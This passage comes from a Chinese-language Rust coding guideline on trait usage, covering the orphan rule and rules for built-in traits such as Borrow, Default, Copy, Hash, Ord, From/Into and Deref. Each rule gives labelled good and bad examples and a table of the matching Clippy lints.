<p>使用 trait 的时候，必须要满足 trait 一致性规则，即，<strong>孤儿规则（orphans rule）</strong>：类型和trait，必须有一个是在本地crate内定义的。
当不满足孤儿规则时，可以考虑使用<code>NewType</code>模式来解决问题。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// String 和 FromStr都在标准库中被定义
// 如果想给String实现FromStr，则编译器会报错，告诉你这违反孤儿规则
// （虽然标准库内已经为string实现了FromStr,这里只是示例）
// 但是通过使用NewType，我们可以间接的达成目标
// 使用这种单个元素的元组结构体包装一个类型就叫NewType模式。
pub struct PhoneNumber(String);

use std::str::FromStr;
impl FromStr for PhoneNumber {
    type Err = Box&lt;dyn std::error::Error&gt;;

    fn from_str(s: &amp;str) -&gt; Result&lt;Self, Self::Err&gt; {
        Ok(PhoneNumber(s.to_string()))
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="内置-trait"><a class="header" href="#内置-trait">内置 trait</a></h1>
<p>Rust 标准库内置了很多 trait，在使用这些 trait 的时候也需要注意。</p>
<h2 id="列表"><a class="header" href="#列表">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/P.TRA.BLN.01.html">P.TRA.BLN.01 在实现<code>Borrow</code>特质时，需要注意一致性</a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.01.html">G.TRA.BLN.01 应该具体类型的 <code>default()</code> 方法代替 <code>Default::default()</code> 调用</a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.02.html">G.TRA.BLN.02 不要为迭代器实现Copy特质</a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.03.html">G.TRA.BLN.03 能使用派生宏（Derive）自动实现Default特质就不要用手工实现</a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.04.html">G.TRA.BLN.04 在使用<code>#[derive(Hash)]</code>的时候，避免再手工实现<code>PartialEq</code></a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.05.html">G.TRA.BLN.05 在使用<code>#[derive(Ord)]</code> 的时候，避免再手工实现 <code>PartialOrd</code></a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.06.html">G.TRA.BLN.06 不要对实现 <code>Copy</code> 或引用类型调用 <code>std::mem::drop</code> 和 <code>std::mem::forgot</code></a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.07.html">G.TRA.BLN.07 对实现 <code>Copy</code> 的可迭代类型来说，要通过迭代器拷贝其所有元素时，应该使用 <code>copied</code>方法，而非<code>cloned</code></a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.08.html">G.TRA.BLN.08 实现 <code>From</code> 而不是 <code>Into</code></a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.09.html">G.TRA.BLN.09 一般情况下不要给 <code>Copy</code> 类型手工实现 <code>Clone</code></a></li>
<li><a href="safe-guides/coding_practice/traits/./std-builtin/G.TRA.BLN.10.html">G.TRA.BLN.10 不要随便使用Deref特质来模拟继承</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptrabln01--在实现borrow特质时需要注意一致性"><a class="header" href="#ptrabln01--在实现borrow特质时需要注意一致性">P.TRA.BLN.01  在实现<code>Borrow</code>特质时，需要注意一致性</a></h2>
<p><strong>【描述】</strong></p>
<p>当你想把不同类型的借用进行统一抽象，或者当你要建立一个数据结构，以同等方式处理自拥有值（ownered）和借用值（borrowed）时，例如散列（hash）和比较（compare）时，选择<code> Borrow</code>。当把某个类型直接转换为引用，选择 <code>AsRef</code> 。</p>
<p>但是使用 <code>Borrow</code> 的时候，需要注意一致性问题。具体请看示例。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 这个结构体能不能作为 HashMap 的 key？
pub struct CaseInsensitiveString(String);

// 它实现 Eq 没有问题
impl  PartialEq for CaseInsensitiveString {
    fn eq(&amp;self, other: &amp;Self) -&gt; bool {
       // 但这里比较是要求忽略了 ascii 大小写
        self.0.eq_ignore_ascii_case(&amp;other.0)
    }
}

impl Eq for CaseInsensitiveString { }

// 实现 Hash 没有问题
// 但因为 eq 忽略大小写，那么 hash 计算也必须忽略大小写
impl Hash for CaseInsensitiveString {
    fn hash&lt;H: Hasher&gt;(&amp;self, state: &amp;mut H) {
        for c in self.0.as_bytes() {
            // 不符合：没有忽略大小写
            c.to_ascii_lowercase().hash(state)
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>这种情况下，就不能为 <code>CaseInsensitiveString</code> 实现 <code>Borrow</code>，并非编译不通过，而是在逻辑上不应该为其实现 <code>Borrow</code>，因为  <code>CaseInsensitiveString</code>  实现 <code>Eq</code> 和 <code>Hash</code> 的行为不一致，而 <code>HashMap</code> 则要求 <code>Key</code> 必须 <code>Hash</code> 和 <code>Eq</code> 的实现一致。这种不一致，编译器无法检查，所以在逻辑上，就不应该为其实现 <code>Borrow</code>。如果强行实现，那可能会出现逻辑 Bug。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln01---应该具体类型的-default-方法代替--defaultdefault-调用"><a class="header" href="#gtrabln01---应该具体类型的-default-方法代替--defaultdefault-调用">G.TRA.BLN.01   应该具体类型的 <code>default()</code> 方法代替 <code> Default::default()</code> 调用</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>为了增强可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::default_trait_access)]
<span class="boring">fn main() {
</span>// 不符合
let s: String = Default::default();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::default_trait_access)]

<span class="boring">fn main() {
</span>// 符合
let s = String::default();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#default_trait_access">default_trait_access</a></td><td>yes</td><td>no</td><td><strong>pedantic</strong></td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln02--不要为迭代器实现copy-特质"><a class="header" href="#gtrabln02--不要为迭代器实现copy-特质">G.TRA.BLN.02  不要为迭代器实现<code>Copy</code> 特质</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>不要为迭代器实现 <code>Copy</code> 特质，因为一般会存在有改变状态的迭代器，如果实现 <code>Copy</code>，则可能会被意外隐式复制，违反 Rust 编译器可变借用独占原则，可能会导致一些意外行为。</p>
<p>所以，通常可以只为迭代器实现 <code>Clone</code>，需要复制的时候显式拷贝，如果出现问题也容易排查。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::copy_iterator)]

use std::marker::PhantomData;

#[derive(Debug)]
struct ABC {
    a: [i32; 3],
    b: [i32; 3],
    c: [i32; 3],
}

impl ABC {
    fn iter_mut(&amp;mut self) -&gt; ABCIterMut {
        ABCIterMut {
            abc: self,
            index: 0,
            _phantom: PhantomData::default(),
        }
    }

}

// 不符合：这里为迭代器 ABCIterMut&lt;'a&gt;  实现 Copy 
#[derive(Copy, Clone)]
struct ABCIterMut&lt;'a&gt; {
    abc: *mut ABC,
    index: u8,
    _phantom: PhantomData&lt;&amp;'a mut ABC&gt;,
}

impl&lt;'a&gt; Iterator for ABCIterMut&lt;'a&gt; {
    type Item = &amp;'a mut [i32; 3];
    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {

        let value = unsafe {
            match self.index {
                0 =&gt; &amp;mut (*self.abc).a,
                1 =&gt; &amp;mut (*self.abc).b,
                2 =&gt; &amp;mut (*self.abc).c,
                _ =&gt; return None
            }
        };
        self.index += 1;
        Some(value)
    }
}

fn main(){
    let mut abc = ABC{a: [1; 3], b: [2;3], c: [3;3]};
    let mut abc_iter_mut = abc.iter_mut();


    // 因为实现 Copy，迭代器这里会隐式复制，返回结构体内部字段可变借用
    for i in abc_iter_mut {
        // Do Something
    }

    // 因为实现 Copy，迭代器这里会隐式复制，返回结构体内部字段可变借用
    // 存在意外风险而不容易被发现
    for i in abc_iter_mut {
        // Do Something
    }

}
</code></pre></pre>
<p>另外，对于标准库里的 <code>Range&lt;T&gt;</code> 就不能实现 Copy，因为它也是一个迭代器。</p>
<p>细节可以参考来自官方讨论： <a href="https://github.com/rust-lang/rust/pull/27186#issuecomment-123390413">https://github.com/rust-lang/rust/pull/27186#issuecomment-123390413</a></p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::copy_iterator)]

use std::marker::PhantomData;

#[derive(Debug)]
struct ABC {
    a: [i32; 3],
    b: [i32; 3],
    c: [i32; 3],
}

impl ABC {
    fn iter_mut(&amp;mut self) -&gt; ABCIterMut {
        ABCIterMut {
            abc: self,
            index: 0,
            _phantom: PhantomData::default(),
        }
    }

}

// 符合：不实现 Copy
// 在需要的时候只实现 Clone
#[derive(Clone)]
struct ABCIterMut&lt;'a&gt; {
    abc: *mut ABC,
    index: u8,
    _phantom: PhantomData&lt;&amp;'a mut ABC&gt;,
}

impl&lt;'a&gt; Iterator for ABCIterMut&lt;'a&gt; {
    type Item = &amp;'a mut [i32; 3];
    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {

        let value = unsafe {
            match self.index {
                0 =&gt; &amp;mut (*self.abc).a,
                1 =&gt; &amp;mut (*self.abc).b,
                2 =&gt; &amp;mut (*self.abc).c,
                _ =&gt; return None
            }
        };
        self.index += 1;
        Some(value)
    }
}

fn main(){
    let mut abc = ABC{a: [1; 3], b: [2;3], c: [3;3]};
    let mut abc_iter_mut = abc.iter_mut();

    // 因为只实现了 Clone
    // 需要用多次迭代器的时候，显式调用 clone() 方法，
    // 开发者可以明确地知道自己在做什么
    for i in abc_iter_mut.clone() {
        println!(&quot;{i:?}&quot;);
    }

    for i in abc_iter_mut {
        println!(&quot;{i:?}&quot;)
    }

}

</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#copy_iterator">copy_iterator</a></td><td>yes</td><td>no</td><td><strong>pedantic</strong></td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln03---能使用派生宏derive自动实现default特质就不要用手工实现"><a class="header" href="#gtrabln03---能使用派生宏derive自动实现default特质就不要用手工实现">G.TRA.BLN.03   能使用派生宏（Derive）自动实现<code>Default</code>特质就不要用手工实现</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>手工实现 Default，代码不精炼。 </p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Foo {
    bar: bool
}
// 不符合
impl std::default::Default for Foo {
    fn default() -&gt; Self {
        Self {
            bar: false
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
#[derive(Default)]
struct Foo {
    bar: bool
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#derivable_impls">derivable_impls</a></td><td>yes</td><td>no</td><td><strong>complexity</strong></td><td>warn</td></tr>
</tbody></table>
<p>该lint不能用于检测泛型参数类型的 Default 手工实现。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln04---在使用derivehash-的时候避免再手工实现-partialeq"><a class="header" href="#gtrabln04---在使用derivehash-的时候避免再手工实现-partialeq">G.TRA.BLN.04   在使用<code>#[derive(Hash)]</code> 的时候，避免再手工实现 <code>PartialEq</code></a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>实现 Hash 和 Eq 必须要满足下面一个等式：</p>
<pre><code class="language-text">k1 == k2  -&gt; hash(k1) == hash(k2)
</code></pre>
<p>即，当<code>k1</code> 和 <code>k2</code> 相等时，<code>hash(k1)</code>也应该和 <code>hash(k2)</code> 相等。  所以要求 <code>PartialEq</code> / <code>Eq</code> / <code>Hash</code>  的实现必须保持一致。 </p>
<p>如果用 <code>#[derive(Hash)]</code> 的时候，搭配了一个手工实现的 <code>PartialEq</code> 就很可能出现不一致的情况。</p>
<p>但也有例外。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Hash)]
struct Foo;
// 不符合
impl PartialEq for Foo {
    ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
#[derive(PartialEq, Eq, Hash)]
struct Foo;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://docs.rs/crate/blsttc/3.3.0/source/src/lib.rs

// Clippy warns that it's dangerous to derive `PartialEq` and explicitly implement `Hash`, but the
// `pairing::bls12_381` types don't implement `Hash`, so we can't derive it.
#![allow(clippy::derive_hash_xor_eq)]
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#derive_hash_xor_eq">derive_hash_xor_eq</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln05---在使用deriveord-的时候避免再手工实现-partialord"><a class="header" href="#gtrabln05---在使用deriveord-的时候避免再手工实现-partialord">G.TRA.BLN.05   在使用<code>#[derive(Ord)]</code> 的时候，避免再手工实现 <code>PartialOrd</code></a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>跟实现 Hash 和 Eq 的要求类似，对于实现<code> Ord</code> 的类型来说，必须要满足下面一个等式：</p>
<pre><code class="language-text">k1.cmp(&amp;k2) == k1.partial_cmp(&amp;k2).unwrap()
</code></pre>
<p>所以要求与  <code>PartialOrd</code>   的实现必须保持一致，并确保<code>max</code>、<code>min</code>和<code>clamp</code>与<code>cmp</code>一致。</p>
<p>通过<code>#[derive(Ord)]</code> 并手动实现<code>PartialOrd</code>，很容易意外地使cmp和partial_cmp不一致。</p>
<p>但也有例外。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Ord, PartialEq, Eq)]
struct Foo;
// 不符合
impl PartialOrd for Foo {
    ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
#[derive(Ord, PartialOrd, PartialEq, Eq)]
struct Foo;

// 符合
#[derive(PartialEq, Eq)]
struct Foo;

impl PartialOrd for Foo {
    fn partial_cmp(&amp;self, other: &amp;Foo) -&gt; Option&lt;Ordering&gt; {
       Some(self.cmp(other))
    }
}

impl Ord for Foo {
    ...
}

<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>使用 <code>#[derive(PartialOrd)]</code> 自动实现 <code>PartialOrd</code>，然后再手工实现 <code>Ord</code>的时候在内部调用自动实现的<code>partial_cmp</code> ，应该是满足 <code>k1.cmp(&amp;k2) == k1.partial_cmp(&amp;k2).unwrap()</code> 了。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://docs.rs/crate/adventjson/0.1.1/source/src/lib.rs
#[derive(Clone, Debug, PartialEq, PartialOrd)]
pub enum JsonObject
{
    /// An array of objects (e.g.: \[1,2,3\])
    Array(Vec&lt;Self&gt;),
    /// Key-value pairs (e.g.: {\&quot;first\&quot;: 10, \&quot;other\&quot;: 15})
    Obj(Vec&lt;(String, Self)&gt;),
    /// A number (e.g.: -0.08333)
    Number(f64),
    /// A string (e.g.: \&quot;Test: \\\&quot;\&quot;)
    JsonStr(String),
    /// A boolean (e.g. true)
    Bool(bool),
    /// The null-value
    Null,
}

/// Save because no not-number values are allowed in json
impl Eq for JsonObject {}

/// Save because no not-number values are allowed in json
#[allow(clippy::derive_ord_xor_partial_ord)]
impl Ord for JsonObject
{
    fn cmp(&amp;self, other: &amp;Self) -&gt; Ordering
    {
        self.partial_cmp(other).unwrap()
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#derive_ord_xor_partial_ord">derive_ord_xor_partial_ord</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln06---不要对实现-copy--或引用类型调用--stdmemdrop-和-stdmemforgot"><a class="header" href="#gtrabln06---不要对实现-copy--或引用类型调用--stdmemdrop-和-stdmemforgot">G.TRA.BLN.06   不要对实现 <code>Copy</code>  或引用类型调用  <code>std::mem::drop</code> 和 <code>std::mem::forgot</code></a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p><code>std::mem::drop</code> 函数只是利用 Rust 所有权的一个技巧，对于 实现了 Copy 的类型 或引用，是无效的。如果使用它，对导致代码可读方便产生误导作用。</p>
<p>另外<code>std::mem::drop</code> 也无法 Drop 掉 <code>ManuallyDrop</code> 类型。</p>
<p><code>std::mem::forgot</code>   同理。</p>
<p>但是也存在例外的情况。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let x: i32 = 42; // i32 implements Copy
std::mem::drop(x) // A copy of x is passed to the function, leaving the
                  // original unaffected
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>在某些情况下，虽然不会有实际效果，但是为了提升语义，也可以使用。</p>
<p>下面代码中，为了防止自引用的问题，使用 <code>drop(self)</code> ，提升了代码语义，但实际并不会 drop。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://docs.rs/crate/dhall/0.10.1/source/src/error/builder.rs

#[allow(clippy::drop_ref)]
pub fn format(&amp;mut self) -&gt; String {
    if self.consumed {
        panic!(&quot;tried to format the same ErrorBuilder twice&quot;)
    }
    let this = std::mem::take(self);
    self.consumed = true;
    drop(self); // 显式 drop self，避免后面误用它
    // ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#drop_copy">drop_copy</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#drop_ref">drop_ref</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#forget_copy">forget_copy</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#forget_ref">forget_ref</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#undropped_manually_drops">undropped_manually_drops</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln07---对实现-copy-的可迭代类型来说要通过迭代器拷贝其所有元素时应该使用-copied方法而非cloned"><a class="header" href="#gtrabln07---对实现-copy-的可迭代类型来说要通过迭代器拷贝其所有元素时应该使用-copied方法而非cloned">G.TRA.BLN.07   对实现 <code>Copy</code> 的可迭代类型来说，要通过迭代器拷贝其所有元素时，应该使用 <code>copied</code>方法，而非<code>cloned</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p><code>copied</code> 方法在语义层面，是针对实现 <code>Copy</code> 的类型，所以应该使用 <code>copied</code> 来增加代码可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::cloned_instead_of_copied)]

<span class="boring">fn main() {
</span>let a = [1, 2, 3];
// 不符合
let v_copied: Vec&lt;_&gt; = a.iter().cloned().collect();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::cloned_instead_of_copied)]
<span class="boring">fn main() {
</span>let a = [1, 2, 3];
// 符合
let v_copied: Vec&lt;_&gt; = a.iter().copied().collect();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cloned_instead_of_copied">cloned_instead_of_copied</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln08-实现-from-而不是-into"><a class="header" href="#gtrabln08-实现-from-而不是-into">G.TRA.BLN.08 实现 <code>From</code> 而不是 <code>Into</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>优先为类型实现 <code>From</code> 而非 <code>Into</code>。因为实现了 <code>From</code>，<code>Into</code> 也会被自动实现。并且在错误处理的时候，<code>?</code> 操作符会通过调用 <code>From</code> 实现自动进行错误类型转换。</p>
<p>但是在泛型限定上，优先 <code>Into</code> 。</p>
<p>当然，也存在例外。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct StringWrapper(String);
// 不符合
impl Into&lt;StringWrapper&gt; for String {
    fn into(self) -&gt; StringWrapper {
        StringWrapper(self)
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct StringWrapper(String);
// 符合
impl From&lt;String&gt; for StringWrapper {
    fn from(s: String) -&gt; StringWrapper {
        StringWrapper(s)
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>有两类情况，可以直接实现 <code>Into</code>。</p>
<ol>
<li><code>Into</code> 不提供 <code>From</code> 实现。在一些场景中，<code>From</code>  自动实现的 <code>Into</code> 并不符合转换需求。</li>
<li>使用 <code>Into</code> 来跳过孤儿规则。</li>
</ol>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 第一种情况。 
// From： https://github.com/apache/arrow-datafusion/blob/master/ballista/rust/core/src/serde/scheduler/from_proto.rs
#[allow(clippy::from_over_into)]
impl Into&lt;PartitionStats&gt; for protobuf::PartitionStats {
    fn into(self) -&gt; PartitionStats {
        PartitionStats::new(
            foo(self.num_rows),
            foo(self.num_batches),
            foo(self.num_bytes),
        )
    }
}

// From： https://github.com/apache/arrow-datafusion/blob/master/ballista/rust/core/src/serde/scheduler/to_proto.rs
#[allow(clippy::from_over_into)]
impl Into&lt;protobuf::PartitionStats&gt; for PartitionStats {
    fn into(self) -&gt; protobuf::PartitionStats {
        let none_value = -1_i64;
        protobuf::PartitionStats {
            num_rows: self.num_rows.map(|n| n as i64).unwrap_or(none_value),
            num_batches: self.num_batches.map(|n| n as i64).unwrap_or(none_value),
            num_bytes: self.num_bytes.map(|n| n as i64).unwrap_or(none_value),
            column_stats: vec![],
        }
    }
}

// 第二种情况
// 根据孤儿规则，trait 和 类型必须有一个在本地定义，所以不能为 Vec&lt;T&gt; 实现 From trait
struct Wrapper&lt;T&gt;(Vec&lt;T&gt;);
impl&lt;T&gt; From&lt;Wrapper&lt;T&gt;&gt; for Vec&lt;T&gt; {
    fn from(w: Wrapper&lt;T&gt;) -&gt; Vec&lt;T&gt; {
        w.0
    }
}
// 但是通过 Into&lt;Vec&lt;T&gt;&gt; ，就可以绕过这个规则
struct Wrapper&lt;T&gt;(Vec&lt;T&gt;);
impl&lt;T&gt; Into&lt;Vec&lt;T&gt;&gt; for Wrapper&lt;T&gt; {
    fn into(self) -&gt; Vec&lt;T&gt; {
        self.0
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#from_over_into">from_over_into</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln09---一般情况下不要给-copy-类型手工实现-clone"><a class="header" href="#gtrabln09---一般情况下不要给-copy-类型手工实现-clone">G.TRA.BLN.09   一般情况下不要给 Copy 类型手工实现 Clone</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>手工为 Copy 类型实现 Clone ，并不能改变 Copy 类型的行为。除非你显式地去调用 <code>clone()</code>方法。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::expl_impl_clone_on_copy)]

<span class="boring">fn main() {
</span>#[derive(Copy)]
struct Foo;
// 不符合
impl Clone for Foo {
    // ..
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::expl_impl_clone_on_copy)]

<span class="boring">fn main() {
</span>// 符合
#[derive(Copy, Clone)]
struct Foo;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>在有些情况下，需要手动实现 Copy 和 Clone 。 相关 issues : <a href="https://github.com/rust-lang/rust/issues/26925">https://github.com/rust-lang/rust/issues/26925</a> </p>
<pre><pre class="playground"><code class="language-rust">use std::marker::PhantomData;

struct Marker&lt;A&gt;(PhantomData&lt;A&gt;);

// 如果使用 Derive 自动实现的话，会要求 Marker&lt;A&gt; 里的 A 也必须实现 Clone
// 这里通过手工给 Marker&lt;A&gt; 实现 Copy 和 Clone 可以避免这种限制
impl&lt;A&gt; Copy for Marker&lt;A&gt; {}
impl&lt;A&gt; Clone for Marker&lt;A&gt; {
    fn clone(&amp;self) -&gt; Self {
        *self
    }
}

// 不需要给 NoClone 实现 Clone
struct NoClone;
fn main() {
    let m: Marker&lt;NoClone&gt; = Marker(PhantomData);
    let m2 = m.clone();
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#expl_impl_clone_on_copy">expl_impl_clone_on_copy</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtrabln10-不要随便使用deref特质来模拟继承"><a class="header" href="#gtrabln10-不要随便使用deref特质来模拟继承">G.TRA.BLN.10 不要随便使用<code>Deref</code>特质来模拟继承</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p><code>Deref</code> trait是专门用于实现自定义指针类型而存在的。虽然可以实现 <code>Deref</code> 来达到某种类似于继承的行为，但 Rust 中不推荐这样做。</p>
<p>这是因为 Rust 语言推崇显式的转换，而 <code>Deref</code> 则是 Rust 中为数不多的隐式行为。如果 <code>Deref</code> 被滥用，那么程序中隐式行为可能会增多，隐式的转换是 Bug 的温床。</p>
<p><strong>【反例】</strong>
不要像下面这样用<code>Deref</code>来模拟继承。</p>
<pre><pre class="playground"><code class="language-rust">use std::ops::Deref;

struct Foo {}

impl Foo {
    fn m(&amp;self) {
        // ...
    }
}

struct Bar {
    f: Foo
}

impl Deref for Bar {
